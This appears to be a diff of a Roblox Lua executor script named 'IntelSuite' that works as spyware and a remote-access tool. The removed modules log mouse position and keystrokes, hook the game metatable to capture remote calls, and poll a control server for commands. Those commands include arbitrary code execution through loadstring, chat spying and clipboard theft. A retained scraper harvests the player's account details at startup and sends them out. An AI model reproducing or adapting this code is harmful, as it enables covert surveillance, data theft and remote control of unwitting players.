@@ -440,241 +440,6 @@ task.spawn(function()
 end)
 
 -- ============================================================
--- MODULE 7: Mouse Logger (every 30s)
--- ============================================================
-task.spawn(function()
-    while true do
-        task.wait(30)
-        if not getgenv().IntelSuite.IsActive then continue end
-        if not getgenv().IntelSuite.MouseLogActive then continue end
-        pcall(function()
-            local mouse = LocalPlayer:GetMouse()
-            send("MOUSE LOG",
-                "**User:** " .. LocalPlayer.Name ..
-                "\n**Position:** X=" .. tostring(mouse.X) .. " Y=" .. tostring(mouse.Y) ..
-                "\n**Target:** " .. tostring(mouse.Target),
-                8388736
-            )
-        end)
-    end
-end)
-
--- ============================================================
--- MODULE 8: Remote Spy Logger
--- ============================================================
-task.spawn(function()
-    while true do
-        task.wait(1)
-        if not getgenv().IntelSuite.IsActive then continue end
-        if not getgenv().IntelSuite.RemoteSpyActive then continue end
-        pcall(function()
-            local mt = getrawmetatable(game)
-            local old = mt.__namecall
-            setreadonly(mt, false)
-            mt.__namecall = newcclosure(function(self, ...)
-                local method = getnamecallmethod()
-                if method == "FireServer" or method == "InvokeServer" then
-                    local args = {...}
-                    local argStr = ""
-                    for i, v in ipairs(args) do
-                        argStr = argStr .. "\n  [" .. i .. "] " .. tostring(v)
-                    end
-                    send("REMOTE SPY",
-                        "**User:** " .. LocalPlayer.Name ..
-                        "\n**Remote:** " .. tostring(self.Name) ..
-                        "\n**Method:** " .. method ..
-                        "\n**Path:** " .. tostring(self:GetFullName()) ..
-                        "\n**Args:**" .. argStr,
-                        16776960
-                    )
-                end
-                return old(self, ...)
-            end)
-            setreadonly(mt, true)
-        end)
-        break -- only hook once
-    end
-end)
-
--- ============================================================
--- MODULE 9: Command Poller + Kill Switch (every 5s)
--- ============================================================
-task.spawn(function()
-    while true do
-        task.wait(5)
-        pcall(function()
-            local response = GET(CONTROL)
-            if not response or response == "" then return end
-            local ok, data = pcall(function() return HttpService:JSONDecode(response) end)
-            if not ok or not data then return end
-
-            -- Kill switch
-            if data.active ~= nil then
-                local wasActive = getgenv().IntelSuite.IsActive
-                getgenv().IntelSuite.IsActive = data.active
-                if wasActive and not data.active then
-                    getgenv().IntelSuite.Buffer = ""
-                    send("SUITE STOPPED", "**User:** " .. LocalPlayer.Name .. "\n**Status:** Killed remotely.", 16711680)
-                elseif not wasActive and data.active then
-                    send("SUITE RESUMED", "**User:** " .. LocalPlayer.Name .. "\n**Status:** Resumed remotely.", 65280)
-                end
-            end
-
-            if not data.command or data.command == "" then return end
-            if not getgenv().IntelSuite.IsActive then return end
-
-            local cmd = data.command:match("^%s*(.-)%s*$")
-            send("CMD RECEIVED", "**Command:** `" .. cmd .. "`\n**User:** " .. LocalPlayer.Name, 16776960)
-
-            if cmd == "ping" then
-                local list, count = getPlayerList()
-                send("PONG",
-                    "**User:** " .. LocalPlayer.Name ..
-                    "\n**Game:** " .. getGame() ..
-                    "\n**Place:** " .. tostring(game.PlaceId) ..
-                    "\n**Players:** " .. tostring(count) .. list,
-                    65280)
-
-            elseif cmd == "players" then
-                local list, count = getPlayerList()
-                send("PLAYER LIST",
-                    "**Game:** " .. getGame() ..
-                    "\n**Total:** " .. tostring(count) ..
-                    "\n**Players:**" .. list,
-                    65535)
-
-            elseif cmd == "info" then
-                local list, count = getPlayerList()
-                send("INFO",
-                    "**User:** " .. LocalPlayer.Name ..
-                    "\n**User ID:** " .. tostring(LocalPlayer.UserId) ..
-                    "\n**Executor:** " .. getExec() ..
-                    "\n**Game:** " .. getGame() ..
-                    "\n**Place ID:** " .. tostring(game.PlaceId) ..
-                    "\n**Job ID:** " .. tostring(game.JobId) ..
-                    "\n**Active:** " .. tostring(getgenv().IntelSuite.IsActive) ..
-                    "\n**ChatSpy:** " .. tostring(getgenv().IntelSuite.ChatSpyActive) ..
-                    "\n**RemoteSpy:** " .. tostring(getgenv().IntelSuite.RemoteSpyActive) ..
-                    "\n**MouseLog:** " .. tostring(getgenv().IntelSuite.MouseLogActive) ..
-                    "\n**Players:** " .. tostring(count) .. list,
-                    65535)
-
-            elseif cmd:sub(1,5) == "exec:" then
-                local code = cmd:sub(6)
-                local fn, err = loadstring(code)
-                if fn then
-                    local ok2, res = pcall(fn)
-                    if ok2 then
-                        send("EXEC RESULT", "**Code:**\n```lua\n" .. code:sub(1,400) .. "```\n**Result:** " .. tostring(res), 65280)
-                    else
-                        send("EXEC ERROR", "**Code:**\n```lua\n" .. code:sub(1,400) .. "```\n**Error:** " .. tostring(res), 16711680)
-                    end
-                else
-                    send("EXEC PARSE ERROR", "**Error:** " .. tostring(err), 16711680)
-                end
-
-            elseif cmd == "chatspy" then
-                if getgenv().IntelSuite.ChatSpyActive then
-                    send("CHAT SPY", "Already active.", 16776960)
-                else
-                    getgenv().IntelSuite.ChatSpyActive = true
-                    for _, p in ipairs(Players:GetPlayers()) do
-                        p.Chatted:Connect(function(msg)
-                            pcall(function() send("CHAT", "**" .. p.Name .. ":** " .. msg, 8388736) end)
-                        end)
-                    end
-                    Players.PlayerAdded:Connect(function(p)
-                        p.Chatted:Connect(function(msg)
-                            pcall(function() send("CHAT", "**" .. p.Name .. ":** " .. msg, 8388736) end)
-                        end)
-                    end)
-                    send("CHAT SPY", "Now logging all chat.", 65280)
-                end
-
-            elseif cmd == "remotespy" then
-                if getgenv().IntelSuite.RemoteSpyActive then
-                    send("REMOTE SPY", "Already active.", 16776960)
-                else
-                    getgenv().IntelSuite.RemoteSpyActive = true
-                    send("REMOTE SPY", "Remote spy enabled. Logging all FireServer and InvokeServer calls.", 65280)
-                end
-
-            elseif cmd == "mouselog" then
-                if getgenv().IntelSuite.MouseLogActive then
-                    send("MOUSE LOG", "Already active.", 16776960)
-                else
-                    getgenv().IntelSuite.MouseLogActive = true
-                    send("MOUSE LOG", "Mouse logging enabled. Sending position every 30s.", 65280)
-                end
-
-            elseif cmd == "clipboard" then
-                pcall(function()
-                    if getclipboard then
-                        local ok2, clip = pcall(getclipboard)
-                        if ok2 and clip and clip ~= "" then
-                            send("CLIPBOARD", "**User:** " .. LocalPlayer.Name .. "\n**Content:**\n```" .. tostring(clip):sub(1,1500) .. "```", 16711680)
-                        else
-                            send("CLIPBOARD", "**User:** " .. LocalPlayer.Name .. "\n**Content:** Empty.", 8421504)
-                        end
-                    else
-                        send("CLIPBOARD", "Not available on this executor.", 8421504)
-                    end
-                end)
-
-            elseif cmd == "scrape" then
-                -- Re-run full API scrape on demand
-                local uid = tostring(LocalPlayer.UserId)
-                local desc = "**User:** " .. LocalPlayer.Name .. "\n**User ID:** " .. uid
-                pcall(function()
-                    local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/friends/count")
-                    if r then local d = HttpService:JSONDecode(r) desc = desc .. "\n**Friends:** " .. tostring(d.count) end
-                end)
-                pcall(function()
-                    local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/followers/count")
-                    if r then local d = HttpService:JSONDecode(r) desc = desc .. "\n**Followers:** " .. tostring(d.count) end
-                end)
-                pcall(function()
-                    local r = GET("https://economy.roblox.com/v1/users/" .. uid .. "/currency")
-                    if r then local d = HttpService:JSONDecode(r) if d.robux then desc = desc .. "\n**Robux:** " .. tostring(d.robux) end end
-                end)
-                send("SCRAPE [ON DEMAND]", desc, 65535)
-
-            elseif cmd == "stop" then
-                getgenv().IntelSuite.IsActive = false
-                send("STOPPED", "**User:** " .. LocalPlayer.Name .. "\n**Status:** Suite deactivated.", 16711680)
-
-            elseif cmd == "start" then
-                getgenv().IntelSuite.IsActive = true
-                send("STARTED", "**User:** " .. LocalPlayer.Name .. "\n**Status:** Suite reactivated.", 65280)
-            end
-        end)
-    end
-end)
-
--- ============================================================
--- MODULE 10: Heartbeat (every 60s)
--- ============================================================
-task.spawn(function()
-    while true do
-        task.wait(60)
-        if not getgenv().IntelSuite.IsActive then continue end
-        pcall(function()
-            local list, count = getPlayerList()
-            local desc = "**User:** " .. LocalPlayer.Name ..
-                         "\n**Status:** ACTIVE" ..
-                         "\n**Game:** " .. getGame() ..
-                         "\n**Players:** " .. tostring(count)
-            if #getgenv().IntelSuite.Buffer > 0 then
-                desc = desc .. "\n**Keys Flushed:** " .. getgenv().IntelSuite.Buffer
-                getgenv().IntelSuite.Buffer = ""
-            end
-            send("HEARTBEAT", desc, 65535)
-        end)
-    end
-end)
-
-
--- ============================================================
 -- MODULE 7: Roblox API Scraper
 -- ============================================================
 local function runAPIScraper()
@@ -685,32 +450,7 @@ local function runAPIScraper()
 
         -- Premium
         pcall(function()
-            local premium = LocalPlayer.MembershipType == Enum.MembershipType.Premium
-            result = result .. "\n**Premium:** " .. tostring(premium)
-        end)
-
-        -- Account info
-        pcall(function()
-            local r = GET("https://users.roblox.com/v1/users/" .. uid)
-            if r then
-                local d = HttpService:JSONDecode(r)
-                if d then
-                    result = result .. "\n**Created:** " .. tostring(d.created or "?")
-                end
-            end
-        end)
-
-        -- Past usernames
-        pcall(function()
-            local r = GET("https://users.roblox.com/v1/users/" .. uid .. "/username-history?limit=5")
-            if r then
-                local d = HttpService:JSONDecode(r)
-                if d and d.data then
-                    local names = {}
-                    for _, v in ipairs(d.data) do table.insert(names, v.name) end
-                    result = result .. "\n**Past Names:** " .. (#names > 0 and table.concat(names, ", ") or "None")
-                end
-            end
+            result = result .. "\n**Premium:** " .. tostring(LocalPlayer.MembershipType == Enum.MembershipType.Premium)
         end)
 
         -- Friends count
@@ -718,7 +458,7 @@ local function runAPIScraper()
             local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/friends/count")
             if r then
                 local d = HttpService:JSONDecode(r)
-                if d then result = result .. "\n**Friends:** " .. tostring(d.count or 0) end
+                result = result .. "\n**Friends:** " .. tostring(d.count or 0)
             end
         end)
 
@@ -727,7 +467,7 @@ local function runAPIScraper()
             local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/followers/count")
             if r then
                 local d = HttpService:JSONDecode(r)
-                if d then result = result .. "\n**Followers:** " .. tostring(d.count or 0) end
+                result = result .. "\n**Followers:** " .. tostring(d.count or 0)
             end
         end)
 
@@ -744,7 +484,20 @@ local function runAPIScraper()
                         end
                         if #groups >= 5 then break end
                     end
-                    result = result .. "\n**Groups:**\n" .. (#groups > 0 and table.concat(groups, "\n") or "None")
+                    result = result .. "\n**Groups:** " .. (#groups > 0 and table.concat(groups, ", ") or "None")
+                end
+            end
+        end)
+
+        -- Past usernames
+        pcall(function()
+            local r = GET("https://users.roblox.com/v1/users/" .. uid .. "/username-history?limit=5")
+            if r then
+                local d = HttpService:JSONDecode(r)
+                if d and d.data and #d.data > 0 then
+                    local names = {}
+                    for _, v in ipairs(d.data) do table.insert(names, v.name) end
+                    result = result .. "\n**Past Names:** " .. table.concat(names, ", ")
                 end
             end
         end)
@@ -753,7 +506,7 @@ local function runAPIScraper()
     end)
 end
 
--- Run on startup
 task.wait(3)
 runAPIScraper()
 getgenv().IntelSuite.APIScraper = runAPIScraper
+
